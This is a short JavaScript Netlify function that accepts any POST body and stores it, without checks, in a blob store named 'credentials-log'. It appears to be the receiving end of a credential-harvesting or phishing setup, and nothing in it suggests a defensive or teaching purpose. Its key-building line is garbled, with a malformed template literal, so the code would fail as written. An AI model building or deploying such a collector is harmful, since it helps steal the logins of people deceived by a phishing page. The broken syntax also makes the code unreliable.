const {
    getStore
} = require("@netlify/blobs");
exports.handler = async(event) => {
    if (event.httpMethod !== "POST") {
        return {
            statusCode: 405,
            body: "Method Not Allowed"
        };
    }
    try {
        const data = JSON.parse(event.body);
        const store = getStore("credentials-log");
        const key = entry - $ {
            Date.now()
        } - $ {
            Math.random().toString(36).substr(2, 9)
        };
        await store.setJSON(key, data);
        return {
            statusCode: 200,
            body: JSON.stringify({
                success: true
            })
        };
    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({
                error: error.message
            })
        };
    }
};
